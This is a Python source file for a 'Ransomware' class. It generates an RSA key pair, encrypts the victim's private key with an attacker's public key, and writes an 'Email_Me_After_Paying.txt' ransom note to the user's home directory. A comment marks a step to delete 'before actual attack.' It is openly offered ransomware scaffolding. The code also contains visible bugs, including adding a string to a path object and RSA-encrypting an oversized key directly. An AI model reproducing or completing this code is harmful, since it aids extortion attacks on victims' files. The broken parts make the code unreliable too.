from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend as crypto_default_backend
from cryptography.hazmat.primitives import serialization as crypto_serialization
from cryptography.hazmat.primitives.asymmetric import padding as crypto_padding
from cryptography.hazmat.primitives import hashes as crypto_hashes
from pathlib import Path


class Ransomware:
    def __init__(self):
        self.pubkey = None
        self.privkey = None
        self.attacker_public_key = None

    def generate_keys(self):
        key = rsa.generate_private_key(
            backend=crypto_default_backend(),
            public_exponent=65537,
            key_size=2048
        )
        self.pubkey = key.public_key().public_bytes(
            crypto_serialization.Encoding.OpenSSH,
            crypto_serialization.PublicFormat.OpenSSH
        )
        self.privkey = key.private_bytes(
            crypto_serialization.Encoding.PEM,
            crypto_serialization.PrivateFormat.PKCS8,
            crypto_serialization.NoEncryption())

    # Writes clients both keys to the disk. Delete private key section before actual attack.
    def write_keys(self):
        with open('private_key.txt', 'wb') as f1:
            f1.write(self.privkey)
        with open('public_key.txt', 'wb') as f2:
            f2.write(self.pubkey)

    def encrypt_private_key(self):
        with open('enc_private_key.txt', 'wb') as f:
            with open("./public.pem", "rb") as key_file:
                self.attacker_public_key = crypto_serialization.load_ssh_public_key(key_file.read(), backend=crypto_default_backend())
                enc_private_key = self.attacker_public_key.encrypt(self.privkey,
                                                                   crypto_padding.OAEP(
                                                                       mgf=crypto_padding.MGF1(
                                                                           algorithm=crypto_hashes.SHA256()),
                                                                       algorithm=crypto_hashes.SHA256(),
                                                                       label=None
                                                                   )
                                                                   )
            f.write(enc_private_key)
        with open(Path.home() + "/Email_Me_After_Paying.txt", "wb") as fa:
            fa.write(enc_private_key)
        self.privkey = None


def main():
    foo = Ransomware()
    foo.generate_keys()
    foo.write_keys()
    foo.encrypt_private_key()


if __name__ == '__main__':
    main()
